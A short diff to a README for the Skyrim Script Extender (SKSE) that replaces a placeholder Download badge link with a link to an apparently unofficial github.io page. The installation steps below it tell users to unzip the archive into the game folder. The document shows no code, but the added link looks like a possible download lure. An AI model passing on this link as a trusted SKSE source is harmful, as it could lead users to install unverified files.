@@ -8,7 +8,7 @@ SKSE is a **core requirement** for mods like **SkyUI, USSEP, and countless gamep
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://skse-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Copy SKSE files into your **Skyrim Special Edition** or **Anniversary Edition** folder.  
